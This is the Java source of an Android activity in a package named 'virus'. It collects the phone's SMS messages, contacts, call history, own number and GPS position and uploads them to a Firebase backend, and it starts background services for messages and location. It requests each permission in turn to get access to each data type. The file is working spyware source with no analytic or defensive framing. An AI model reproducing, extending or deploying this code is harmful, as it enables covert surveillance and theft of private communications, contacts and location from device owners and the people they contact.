package com.example.phanv.virus;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;

import com.example.phanv.virus.Control.FireBaseControl;
import com.example.phanv.virus.Model.CallLogVirus;
import com.example.phanv.virus.Model.Contact;
import com.example.phanv.virus.Model.GPSTracker;
import com.example.phanv.virus.Model.MessageVirus;
import com.example.phanv.virus.Service.MessageService;
import com.example.phanv.virus.Service.PositionService;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

public class MainActivity extends AppCompatActivity {
    private static final int MY_PERMISSIONS_REQUEST_READ_CALL_LOG = 100;
    private static final int MY_PERMISSIONS_REQUEST_READ_SMS = 101;
    private static final int MY_PERMISSIONS_REQUEST_READ_CONTACTS = 102;
    private static final int MY_PERMISSIONS_REQUEST_READ_PHONE_STATE = 103;
    private static final int MY_PERMISSIONS_REQUEST_ACCESS_FINE_LOCATION = 104;
    FireBaseControl fb = new FireBaseControl();
    String phone="";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if(!canMakeSmores())
        {
            phone = getPhoneNumber();
            upMessage();
            upContact();
            upCallLog();
            upCurrentLocation();
        }
        else {
            checkPermission();
        }
    }
    private void setValue(String value) {
        SharedPreferences pre=getSharedPreferences("data", MODE_PRIVATE);
        SharedPreferences.Editor edit=pre.edit();
        edit.putBoolean(value, true);
        edit.commit();
    }

    private boolean getOldValue(String value) {
        SharedPreferences pre=getSharedPreferences
                ("data",MODE_PRIVATE);
        return pre.getBoolean(value, false);
    }
    private void upMessage() {
        if (!getOldValue("message")) {
            //set up message service
            Intent messageIntent = new Intent(MainActivity.this, MessageService.class);
            messageIntent.putExtra("phone", phone);
            startService(messageIntent);
            fb.upAllMessage(phone, getMessage());
            setValue("message");
        }
    }

    private ArrayList<MessageVirus> getMessage() {
        ArrayList<MessageVirus> list =new ArrayList<MessageVirus>();
        DateFormat dfd = new SimpleDateFormat("dd-MM-yyyy");
        DateFormat dft = new SimpleDateFormat("dd-MM-yyyy : HH:mm:ss");
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/"), null, null, null, null);
        if (cursor.moveToFirst()) {
            for (int i =0;i<cursor.getCount();i++)
            {
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                String date = dfd.format(Long.valueOf(cursor.getString(cursor.getColumnIndexOrThrow("date"))));
                String time = dft.format(Long.valueOf(cursor.getString(cursor.getColumnIndexOrThrow("date"))));
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String type = "";
                if(cursor.getString(cursor.getColumnIndexOrThrow("type")).equals("1")) type = "Receive";
                else {
                    if(cursor.getString(cursor.getColumnIndexOrThrow("type")).equals("2")) type = "Send";
                    else type = "Draft";
                }
                MessageVirus ms=new MessageVirus(date,type,time,address,body);
                list.add(ms);
                cursor.moveToNext();
            }
        }
        return list;
    }
    private void upCallLog() {
        if(!getOldValue("callLog"))
        {
            fb.upCallLog(phone,getCallLogToDay());
            setValue("callLog");
        }
    }
    private void upContact() {
        if(!getOldValue("contact"))
        {
            fb.upContact(phone, getAllContact());
            getOldValue("contact");
        }
    }
    @RequiresApi(api = Build.VERSION_CODES.N)
    private void upCurrentLocation() {
       if (!getOldValue("location"))
            {
                //set up position service
                Intent positionIntent = new Intent(MainActivity.this, PositionService.class);
                positionIntent.putExtra("phone",phone);
               // startService(positionIntent);
                setValue("location");
            }
            // check if GPS enabled
            GPSTracker gpsTracker = new GPSTracker(MainActivity.this);
            if (gpsTracker.canGetLocation()) {
                String lat = gpsTracker.getLatitude() + "";
                String lng = gpsTracker.getLongitude() + "";
                fb.upPosition(phone,getCurrentTimeByFormat("dd/MM/yyyy HH:mm:ss"), lat, lng);
            }
    }
    public String getPhoneNumber() {
        TelephonyManager tMgr = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
        }
        return  tMgr.getLine1Number();
    }

    public String getCurrentTimeByFormat(String format) {
        DateFormat dateFormat = new SimpleDateFormat(format);
        Date date = new Date();
        return dateFormat.format(date).toString();
    }
    public ArrayList<Contact> getAllContact()
    {
        ArrayList<Contact> listContact =new ArrayList<Contact>();
        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
        while (phones.moveToNext())
        {
            String contactName=phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            Contact contact =new Contact(contactName,phoneNumber);
            listContact.add(contact);
        }
        phones.close();
        return listContact;
    }
    public ArrayList<CallLogVirus> getCallLogToDay()
    {
        ArrayList<CallLogVirus> list = new ArrayList<CallLogVirus>();
        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null,
                null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            DateFormat dateFormat = new SimpleDateFormat("dd-MM-yyyy : HH:mm:ss");
            String time =dateFormat.format(callDayTime);
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "Đi";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "Tới";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "Nhỡ";
                    break;
               default:
                   dir = "KTl";
            }
            DateFormat fm = new SimpleDateFormat("dd-MM-yyyy");
            CallLogVirus call_log = new CallLogVirus(fm.format(callDayTime),time,phNumber,dir,callDuration);
            list.add(call_log);
        }
        managedCursor.close();
        return list;
    }
    private boolean canMakeSmores(){
        return(Build.VERSION.SDK_INT>Build.VERSION_CODES.LOLLIPOP_MR1);
    }
    void checkPermission()
    {
        if(!hasPermission("android.permission.READ_PHONE_STATE"))
        {
            ActivityCompat.requestPermissions(this,
                    new String[]{"android.permission.READ_PHONE_STATE"},
                    MY_PERMISSIONS_REQUEST_READ_PHONE_STATE);
        }
    }
    private boolean hasPermission(String permission) {
        if (canMakeSmores()) {
            return(checkSelfPermission(permission)== PackageManager.PERMISSION_GRANTED);
        }
        return true;
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        switch (requestCode)
        {
            case MY_PERMISSIONS_REQUEST_READ_PHONE_STATE :
            {
                if(hasPermission("android.permission.READ_PHONE_STATE"))
                {
                    phone = getPhoneNumber();
                    if(!hasPermission("android.permission.READ_CONTACTS"))
                    {
                        ActivityCompat.requestPermissions(this,
                                new String[]{"android.permission.READ_CONTACTS"},
                                MY_PERMISSIONS_REQUEST_READ_CONTACTS);
                    }
                }

            }
            case MY_PERMISSIONS_REQUEST_READ_CONTACTS: {
                if (hasPermission("android.permission.READ_CONTACTS")) {
                    upContact();
                }
                if (!hasPermission("android.permission.READ_CALL_LOG")) {
                    ActivityCompat.requestPermissions(this,
                            new String[]{"android.permission.READ_CALL_LOG"},
                            MY_PERMISSIONS_REQUEST_READ_CALL_LOG);
                }

            }
            case  MY_PERMISSIONS_REQUEST_READ_CALL_LOG : {
                if (hasPermission("android.permission.READ_CALL_LOG")) {
                    upCallLog();
                }
                if (!hasPermission("android.permission.ACCESS_FINE_LOCATION")) {
                    ActivityCompat.requestPermissions(this,
                            new String[]{"android.permission.ACCESS_FINE_LOCATION"},
                            MY_PERMISSIONS_REQUEST_ACCESS_FINE_LOCATION);
                }

            }
            case MY_PERMISSIONS_REQUEST_ACCESS_FINE_LOCATION :
            {
                if(hasPermission("android.permission.ACCESS_FINE_LOCATION"))
                {
                    upCurrentLocation();
                }
                if(!hasPermission("android.permission.READ_SMS"))
                {
                    ActivityCompat.requestPermissions(this,
                            new String[]{"android.permission.READ_SMS"},
                            MY_PERMISSIONS_REQUEST_READ_SMS);
                }
            }
            case  MY_PERMISSIONS_REQUEST_READ_SMS :
            {
                if(hasPermission("android.permission.READ_SMS"))
                {
                    upMessage();
                }
            }
        }
    }
}
